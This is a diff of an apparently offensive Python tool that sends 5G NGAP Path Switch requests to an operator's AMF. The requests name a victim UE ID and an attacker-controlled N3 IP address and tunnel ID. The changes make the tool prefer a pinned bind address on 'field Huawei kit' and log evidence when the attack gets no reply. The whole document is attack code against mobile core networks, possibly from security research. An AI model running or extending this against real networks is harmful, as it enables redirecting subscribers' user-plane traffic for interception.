@@ -57,6 +57,11 @@ def detect_local_ip(peer_ip: str, peer_port: int = 38412) -> str:
 def resolve_attacker_ip(cfg, a) -> str:
     ip = getattr(a, "attacker_ip", None)
     if ip in (None, "auto"):
+        # Field Huawei kit binds SCTP to a pinned HOST_IP. Prefer that so the
+        # Path Switch N3 endpoint is not some other interface detect_local_ip
+        # might pick.
+        if cfg.get("bind_ip"):
+            return cfg["bind_ip"]
         return detect_local_ip(cfg["amf_addr"], int(cfg.get("amf_port", 38412)))
     return ip
 
@@ -190,6 +195,10 @@ def cmd_path_switch(gnb, a):
         attacker_ip=attacker_ip, teid=a.teid, **seccap))
     if not r:
         print("[path-switch] no reply (victim id likely not resolvable / rejected silently)")
+        _save(a.evidence, {"attack": "path-switch",
+                           "source_amf_ue_id": a.source_amf_ue_id,
+                           "attacker_n3_ip": attacker_ip, "teid": a.teid,
+                           "result": None})
         return
     mt = ngap.message_type(r)
     print(f"[path-switch] reply: {ngap.summarize(r)}")
